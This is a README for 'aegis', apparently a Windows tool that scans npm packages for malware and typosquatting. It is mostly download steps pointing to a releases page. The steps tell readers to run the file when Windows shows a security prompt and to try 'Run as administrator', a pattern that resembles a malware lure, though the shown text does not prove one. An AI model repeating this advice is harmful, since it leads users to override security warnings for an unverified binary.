# 🔒 aegis - Scan packages before install

[![Download aegis](https://img.shields.io/badge/Download-aegis-blue?style=for-the-badge)](https://github.com/Hyacinthiethick289/aegis/releases)

## 🛡️ What aegis does

aegis scans npm packages before you install them. It checks for signs of malicious code, typosquatting, and known security issues in dependencies.

Use it to review packages before they reach your machine. It helps you spot risk early, before a bad package becomes part of your project.

## 📥 Download for Windows

Visit this page to download:

https://github.com/Hyacinthiethick289/aegis/releases

On that page, look for the latest release and pick the Windows file. In most cases, this will be an `.exe` file or a Windows zip file.

If you download a zip file, unpack it first, then open the app from the folder.

## 🚀 Install and run

1. Open the [releases page](https://github.com/Hyacinthiethick289/aegis/releases).
2. Find the latest release at the top of the page.
3. Under **Assets**, choose the Windows download.
4. Save the file to your computer.
5. If you downloaded a zip file, right-click it and choose **Extract All**.
6. Open the extracted folder.
7. Double-click the `aegis` app file to start it.

If Windows shows a security prompt, choose the option to run the file.

## 🔎 How to use it

aegis is made for checking npm packages before install.

A simple flow looks like this:

1. Open aegis.
2. Paste or select the package name you want to inspect.
3. Run a scan.
4. Review the results.
5. Check any package marked as risky before you install it.

It can help you spot:

- malware in package code
- typosquatting, where a name looks like a trusted package
- known CVEs
- compromised dependencies
- unsafe patterns in package files

## 🖥️ Windows setup

aegis is built to run on Windows with a simple desktop or command-line workflow.

Recommended setup:

- Windows 10 or Windows 11
- An internet connection for package checks
- Enough free space to store the app and scan results
- Permission to run downloaded apps

If you plan to scan many packages, keep the app in a folder you can find again later.

## 📦 What you may see in a scan

Aegis can show you useful details about a package before install.

Typical scan results may include:

- package name and version
- risk flags
- known vulnerability matches
- package tree details
- suspicious file patterns
- security notes for dependency chains
- SARIF output for tools that read security reports

## 🧭 Best way to check a package

If you want a simple process, follow this order:

1. Check the package name for spelling issues.
2. Review the publisher name.
3. Look at the package version.
4. Scan the package in aegis.
5. Check any warning in the report.
6. Compare the package with the one you meant to install.
7. Install only when the result looks safe.

## 🧰 Common use cases

aegis is useful when you want to:

- review a new npm package before install
- check a dependency update
- compare a package name against known trusted packages
- inspect a package for hidden risk
- review security issues in a build pipeline
- export scan results for later review

## 📄 File types and output

aegis may work with several output formats based on the scan you run.

Common output includes:

- on-screen results
- security report files
- SARIF output for code security tools
- package analysis data for deeper review

If you save a report, keep it with the project so you can check it later.

## ⚙️ Basic requirements

To run aegis on Windows, you should have:

- a modern Windows PC
- access to the internet
- enough memory to open a desktop app or terminal tool
- permission to read files in the folder you scan

For best results, close other heavy apps while you run a large scan.

## 🧪 Example workflow

If you want to check a package name before install:

1. Download aegis from the releases page.
2. Open the app.
3. Enter the package name.
4. Start the scan.
5. Read the report.
6. If the package looks clean, continue with your install.
7. If the report shows risk, stop and review the package source

## 🗂️ Topics covered

aegis focuses on package safety across the npm supply chain, including:

- npm security
- package security
- supply-chain checks
- vulnerability scanning
- malware detection
- typosquatting checks
- dependency review
- static analysis
- devsecops support
- CVE detection

## 🔧 If the app does not open

If Windows does not start the file:

1. Check that the download finished.
2. Make sure you extracted the zip file if you downloaded one.
3. Try opening the file again.
4. Right-click the file and choose **Run as administrator** if your account allows it.
5. Download the latest release again if the file looks broken.

## 📁 Keep your download safe

Use the latest release from the official page only. Keep the file in a folder you trust, such as `Downloads` or a project tools folder.

If you use aegis often, create a shortcut so you can open it fast

## 📌 Project focus

- Repository name: aegis
- Description: Supply-chain security scanner for npm packages
- Platform focus: Windows download and use
- Main goal: help you check packages before install